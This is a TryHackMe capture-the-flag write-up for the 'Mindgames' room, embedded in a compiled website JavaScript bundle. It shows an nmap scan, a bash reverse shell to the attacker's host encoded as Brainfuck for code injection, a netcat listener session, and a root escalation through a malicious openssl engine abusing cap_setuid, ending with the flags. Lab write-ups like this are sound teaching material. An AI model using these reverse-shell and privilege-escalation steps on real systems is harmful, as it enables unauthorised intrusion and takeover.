"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1470],{3905:(e,n,t)=>{t.d(n,{Zo:()=>m,kt:()=>g});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},m=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,s=e.originalType,l=e.parentName,m=i(e,["components","mdxType","originalType","parentName"]),p=c(t),u=a,g=p["".concat(l,".").concat(u)]||p[u]||d[u]||s;return t?r.createElement(g,o(o({ref:n},m),{},{components:t})):r.createElement(g,o({ref:n},m))}));function g(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var s=t.length,o=new Array(s);o[0]=u;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[p]="string"==typeof e?e:a,o[1]=i;for(var c=2;c<s;c++)o[c]=t[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},48712:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>c});var r=t(87462),a=(t(67294),t(3905));const s={},o="Mindgames",i={unversionedId:"Tryhackme/Mindgames/Mindgames",id:"Tryhackme/Mindgames/Mindgames",title:"Mindgames",description:"Just a terrible idea...",source:"@site/writeups/Tryhackme/Mindgames/Mindgames.md",sourceDirName:"Tryhackme/Mindgames",slug:"/Tryhackme/Mindgames/",permalink:"/writeups/Tryhackme/Mindgames/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Metaspliot",permalink:"/writeups/Tryhackme/Metaspliot/Metasploit"},next:{title:"Misguided Ghosts",permalink:"/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Capture the flags",id:"task-1-capture-the-flags",level:2}],m={toc:c},p="wrapper";function d(e){let{components:n,...t}=e;return(0,a.kt)(p,(0,r.Z)({},m,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"mindgames"},"Mindgames"),(0,a.kt)("p",null,"Just a terrible idea..."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/mindgames"},"Mindgames")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Code Injection (RCE)"),(0,a.kt)("li",{parentName:"ul"},"Capabilities")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-capture-the-flags"},"Task 1 Capture the flags"),(0,a.kt)("p",null,"No hints. Hack it. Don't give up if you get stuck, enumerate harder"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Mindgames$ sudo nmap -A -sS -sC -sV --script vuln 10.10.69.233\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 10:45 CEST\nPre-scan script results:\n| broadcast-avahi-dos:\n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.69.233\nHost is up (0.037s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| vulners:\n|   cpe:/a:openbsd:openssh:7.6p1:\n|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111\n|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919\n|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473\n|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905\n|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110\n|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109\n|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n| http-fileupload-exploiter:\n|\n|_    Couldn't find a file-type field.\n|_http-passwd: ERROR: Script execution failed (use -d to debug)\n| http-slowloris-check:\n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server's resources causing Denial Of Service.\n|\n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=33922%PV=Y%DS=2%DC=T%G=Y%TM=5F856B\nOS:59%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT      ADDRESS\n1   36.05 ms 10.8.0.1\n2   36.23 ms 10.10.69.233\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 573.71 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.69.233/"},"http://10.10.69.233/")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.69.233/main.js"},"view-source:http://10.10.69.233/main.js")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'async function postData(url = "", data = "") {\n  // Default options are marked with *\n  const response = await fetch(url, {\n    method: "POST", // *GET, POST, PUT, DELETE, etc.\n    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached\n    credentials: "same-origin", // include, *same-origin, omit\n    headers: {\n      "Content-Type": "text/plain",\n    },\n    redirect: "follow", // manual, *follow, error\n    referrerPolicy: "no-referrer", // no-referrer, *client\n    body: data, // body data type must match "Content-Type" header\n  });\n  return response; // We don\'t always want JSON back\n}\nfunction onLoad() {\n  document\n    .querySelector("#codeForm")\n    .addEventListener("submit", function (event) {\n      event.preventDefault();\n      runCode();\n    });\n}\nasync function runCode() {\n  const programBox = document.querySelector("#code");\n  const outBox = document.querySelector("#outputBox");\n  outBox.textContent = await (\n    await postData("/api/bf", programBox.value)\n  ).text();\n}\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},"import os\nos.system('bash -c \"bash -i >& /dev/tcp/10.8.106.222/9001 0>&1\"')\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://copy.sh/brainfuck/text.html"},"Create a Brainfuck code that outputs a given text")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"+[-----\x3e+++<]>++.++++.+++.-.+++.++.[----\x3e+<]>+++.+++++[->+++<]>.++++.>++++++++++.-[-------\x3e+<]>.++++.+[++>---<]>.[---\x3e++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.-.-[---\x3e+<]>.-.--[---\x3e+<]>--.-----------.--[---\x3e+<]>--.--[--\x3e+++<]>.-[---\x3e+<]>-.[---\x3e+<]>-.++.-[->+++<]>-.-.--[---\x3e+<]>--.-----------.--[---\x3e+<]>--.--[--\x3e+++<]>.[---\x3e+++++++<]>.[---\x3e+<]>---.-[->++<]>.--[---\x3e++<]>--.------.[--\x3e+++<]>-.[---\x3e+<]>-.+.[---\x3e+<]>-.[++>---<]>--.-[---\x3e++<]>.++[->+++<]>+.+++++++++++++.[->+++++<]>-.++.-.--.++++++++++.----------.+++.-.++++++.--------.++++...---.++++++++++.---------..+.-[---\x3e++<]>.[--\x3e+++<]>.+[-----\x3e+<]>+.--[---\x3e++<]>--.+++++++++++.++[---\x3e++<]>.+++++.++.\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Mindgames$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.69.233] 37224\nbash: cannot set terminal process group (678): Inappropriate ioctl for device\nbash: no job control in this shell\nmindgames@mindgames:~/webserver$ whoami\nwhoami\nmindgames\nmindgames@mindgames:~/webserver$ ls -la\nls -la\ntotal 7032\ndrwxrwxr-x 3 mindgames mindgames    4096 May 11 15:36 .\ndrwxr-xr-x 6 mindgames mindgames    4096 May 11 15:36 ..\ndrwxrwxr-x 2 mindgames mindgames    4096 May 11 15:29 resources\n-rwxrwxr-x 1 mindgames mindgames 7188315 May 11 15:31 server\nmindgames@mindgames:~/webserver$ cd\ncd\nmindgames@mindgames:~$ ls -la\nls -la\ntotal 40\ndrwxr-xr-x 6 mindgames mindgames 4096 May 11 15:36 .\ndrwxr-xr-x 4 root      root      4096 May 11 13:48 ..\nlrwxrwxrwx 1 mindgames mindgames    9 May 11 15:25 .bash_history -> /dev/null\n-rw-r--r-- 1 mindgames mindgames  220 May 11 13:48 .bash_logout\n-rw-r--r-- 1 mindgames mindgames 3771 May 11 13:48 .bashrc\ndrwx------ 2 mindgames mindgames 4096 May 11 14:07 .cache\ndrwx------ 3 mindgames mindgames 4096 May 11 14:07 .gnupg\ndrwxrwxr-x 3 mindgames mindgames 4096 May 11 15:24 .local\n-rw-r--r-- 1 mindgames mindgames  807 May 11 13:48 .profile\n-rw-rw-r-- 1 mindgames mindgames   38 May 11 15:24 user.txt\ndrwxrwxr-x 3 mindgames mindgames 4096 May 11 15:36 webserver\nmindgames@mindgames:~$ cat user.txt\ncat user.txt\nthm{411f7d38247ff441ce4e134b459b6268}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"mindgames@mindgames:~/webserver$ getcap -r / 2> /dev/null\ngetcap -r / 2> /dev/null\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/bin/openssl = cap_setuid+ep\n/home/mindgames/webserver/server = cap_net_bind_service+ep\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/openssl/#sudo"},"https://gtfobins.github.io/gtfobins/openssl/#sudo")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/"},"https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Mindgames$ gcc -fPIC -o rootshell.o -c rootshell.c\nkali@kali:~/CTFs/tryhackme/Mindgames$ gcc -shared -o rootshell.so -lcrypto rootshell.o\nkali@kali:~/CTFs/tryhackme/Mindgames$ sudo python3 -m http.server 80\n[sudo] password for kali:\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.69.233 - - [13/Oct/2020 11:03:58] "GET /rootshell.so HTTP/1.1" 200 -\n^C\nKeyboard interrupt received, exiting.\nkali@kali:~/CTFs/tryhackme/Mindgames$\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"mindgames@mindgames:~/webserver$ chmod +x rootshell.so\nchmod +x rootshell.so\nmindgames@mindgames:~/webserver$ openssl req -engine ./rootshell.so\nopenssl req -engine ./rootshell.so\nwhoami\nroot\ncd /root\nls\nroot.txt\ncat root.txt\nthm{1974a617cc84c5b51411c283544ee254}\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"User flag.")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{411f7d38247ff441ce4e134b459b6268}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Root flag.")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{1974a617cc84c5b51411c283544ee254}")))}d.isMDXComponent=!0}}]);